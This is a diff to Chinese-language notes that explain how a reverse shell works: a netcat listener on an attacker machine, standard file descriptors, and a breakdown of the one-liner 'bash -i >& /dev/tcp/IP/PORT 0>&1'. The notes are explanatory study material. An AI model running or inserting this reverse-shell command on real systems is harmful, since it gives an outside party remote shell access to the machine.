@@ -24,7 +24,7 @@ tty(Teletypewriter)
 //指Linux和Unix系统中，允许用户与内核操作(系统交互)之间的Socket。负责处理命令和字节流的传输以实现操控。
 
 nc -lvpn <PORT>
-//进行监听
+//进行监听，在攻击机在监听本地<PORT>端口的同时，实际上这个端口已经成为了TCP Socket。
 
 0 = stdin //标准输入，命令输入的位置
 1 = stdout //标准输出，正常结果的输出位置
@@ -38,5 +38,3 @@ nc -lvpn <PORT>
 bash -i >& /dev/tcp/IP/PORT 0>&1
 /* 命令逐层拆解，将bash -i的标准输出和标准错误输出重定向 >& 至新建立的虚拟TCP Socket中, 
 并将 0>&1 标准输入(Socket)重定向(复制)至标准输出(Socket)的位置。*/
-
-当攻击机在监听本地<PORT>端口的同时，实际上这个端口已经成为了
